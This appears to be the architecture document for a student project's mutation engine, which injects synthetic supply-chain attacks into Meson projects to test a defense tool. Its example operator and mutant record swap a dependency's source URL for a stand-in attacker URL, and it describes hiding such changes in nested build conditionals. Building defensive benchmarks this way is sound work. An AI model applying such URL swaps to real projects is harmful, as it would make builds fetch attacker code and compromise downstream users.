# Mutation Engine Architecture

**CIS 6614 — Group 14 | Adversarial Mutation Testing for Pipeline Security**

---

## Overview

The mutation engine generates synthetic supply-chain attacks against real Meson-based
open-source projects. Each attack is a *mutant*: a copy of a project with one
semantically meaningful field changed. The engine feeds a benchmark of mutants
to PipelineSave, measuring whether the defense tool can block, detect, or miss each
injection at a known difficulty level.

---

## Four-Step Pipeline

```
┌─────────┐    parse_project()    ┌──────────────┐
│  Target │ ─────────────────────▶│ parsed_project│
│ Project │                       └──────┬───────┘
└─────────┘                              │
                                         │ find_candidates()
                                         ▼
                                  ┌──────────────┐
             operator YAML ──────▶│  Candidates  │
                                  └──────┬───────┘
                                         │
                                         │ fill_template()
                                         ▼
                                  ┌──────────────┐
                                  │Filled Operator│
                                  └──────┬───────┘
                                         │
                                         │ generate_mutant()
                                         ▼
                                  ┌──────────────┐
                                  │    Mutant    │
                                  │   (on disk)  │
                                  └──────────────┘
```

### Step 1 — Parse (`src/parser/`)

`parse_project(project_dir)` reads the entire Meson project and returns a
structured dict with three keys:

| Key | Contents |
|-----|----------|
| `wrap_files` | All `.wrap` INI files from `subprojects/` — source URLs, hashes, directory names |
| `conditionals` | Every `if`/`elif`/`endif` block across all `meson.build` files, with depth and line numbers |
| `dependencies` | Every `dependency()` call, with name, required flag, and file location |

Two sub-modules handle different file formats:
- `wrap_parser.py` — uses `configparser` for INI-format `.wrap` files
- `meson_parser.py` — uses regex for `meson.build` `if`/`elif`/`dependency()` patterns

### Step 2 — Place (`src/placement/`)

`find_candidates(parsed_project, operator)` routes to one of three placement
strategies based on `operator["scheme"]`:

| Scheme | Module | Description |
|--------|--------|-------------|
| `dependency_aware` | `dependency_aware.py` | Targets `.wrap` URLs and `dependency()` calls — direct supply-chain surface |
| `config_aware` | `config_aware.py` | Targets `if`/`elif` blocks — injection activates only under specific build conditions |
| `adversarial` | `adversarial.py` | Combines both — injection requires both a dependency context AND a conditional guard |

Each candidate includes: `scheme`, `file_path`, `field`, `current_value`,
`placeholder_map`, and (after `difficulty.py`) a `difficulty` rating 1–4.

**Difficulty scale:**

| Rating | Meaning |
|--------|---------|
| 1 | Main code path, no guards, obvious field (e.g., top-level `source_url`) |
| 2 | Inside one conditional branch, or non-obvious field |
| 3 | Nested conditional (depth ≥ 2), or adversarial combination |
| 4 | Deeply nested, platform-specific, rarely-executed branch |

### Step 3 — Fill (`src/engine/template_filler.py`)

`fill_template(operator, candidate)` resolves all `{{PLACEHOLDER}}` fields in the
operator's `template` section using the candidate's `placeholder_map`.

Example:

```yaml
# data/operators/wrap_url_swap.yaml
template:
  file_path: "{{WRAP_FILE}}"
  replacement_value: "https://evil.example.com/malicious.tar.gz"
```

```python
# candidate.placeholder_map
{"WRAP_FILE": "subprojects/zlib.wrap", "ORIGINAL_URL": "https://zlib.net/zlib-1.3.tar.gz"}
```

→ Produces a filled operator with concrete `file_path` and `replacement_value`.

### Step 4 — Generate (`src/engine/mutant_generator.py`)

`generate_mutant(project_dir, filled_operator, out_dir)` copies the entire project
to `out_dir` and applies one targeted `str.replace()` on the resolved file. The
function returns a *mutant record* that captures the full provenance of the change.

---

## Directory Layout

```
Mutation-Testing-for-Pipeline-Security/
├── data/
│   ├── operators/          # YAML operator specs (one attack type per file)
│   ├── targets/            # Cloned source projects (gitignored)
│   │   ├── numpy/          # NumPy v2.0.0
│   │   ├── scipy/          # SciPy v1.14.0
│   │   └── gnome-glib/     # GLib v2.80.0
│   ├── benchmark/          # Generated mutants (gitignored)
│   ├── evaluation/         # PipelineSave results
│   ├── taxonomy/           # Attack taxonomy docs
│   └── diagrams/
├── src/
│   ├── parser/
│   │   ├── wrap_parser.py       # .wrap INI parser
│   │   └── meson_parser.py      # meson.build regex parser
│   ├── placement/
│   │   ├── placer_api.py        # Public entry point: find_candidates()
│   │   ├── dependency_aware.py  # TODO (David)
│   │   ├── config_aware.py      # TODO (David)
│   │   ├── adversarial.py       # TODO (David)
│   │   └── difficulty.py        # TODO (David)
│   └── engine/
│       ├── template_filler.py   # Resolves {{PLACEHOLDER}} fields
│       └── mutant_generator.py  # Copies project and applies change
├── tests/
│   ├── conftest.py         # Shared fixtures
│   ├── fixtures/           # Minimal .wrap and meson.build files
│   └── test_parser.py      # Parser unit tests
├── scripts/
│   └── setup_targets.sh    # Clone the three target projects
└── docs/
    └── engine_architecture.md   # This file
```

---

## Operator YAML Format

```yaml
id: op-url-swap
name: Wrap URL Swap
scheme: dependency_aware         # dependency_aware | config_aware | adversarial

# Human-readable description of each placeholder key
placeholders:
  WRAP_FILE:    "relative path to the .wrap file"
  ORIGINAL_URL: "the legitimate source_url value"

# The template section may contain {{KEY}} placeholders
template:
  file_path:         "{{WRAP_FILE}}"
  replacement_value: "https://evil.example.com/malicious.tar.gz"
```

---

## Data Flow — Mutant Record

The final output of one engine run is a mutant record dict:

```python
{
    "mutant_dir":        "/path/to/data/benchmark/numpy_op-url-swap_0001/",
    "operator_id":       "op-url-swap",
    "operator_name":     "Wrap URL Swap",
    "file_path":         "subprojects/openblas.wrap",
    "field":             "source_url",
    "original_value":    "https://github.com/OpenMathLib/OpenBLAS/...",
    "replacement_value": "https://evil.example.com/malicious.tar.gz",
    "scheme":            "dependency_aware",
    "difficulty":        1,
    "applied":           True,
}
```

This record is written to `data/evaluation/` alongside the PipelineSave result
(`BLOCKED`, `DETECTED`, or `MISSED`) for downstream analysis.

---

## Ownership

| Component | Owner |
|-----------|-------|
| `src/parser/` (both files) | Daniel |
| `src/engine/` (both files) | Daniel |
| `src/placement/placer_api.py` | Daniel |
| `src/placement/dependency_aware.py` | David |
| `src/placement/config_aware.py` | David |
| `src/placement/adversarial.py` | David |
| `src/placement/difficulty.py` | David |
| `data/operators/*.yaml` | Both |
| `tests/` | Both |

---

## Running the Tests

```bash
# From repo root
pip install -r src/requirements.txt
pytest tests/ -v
```

## Setting Up Target Projects

```bash
bash scripts/setup_targets.sh
```

This clones NumPy v2.0.0, SciPy v1.14.0, and GLib v2.80.0 into `data/targets/`.
All three directories are gitignored.
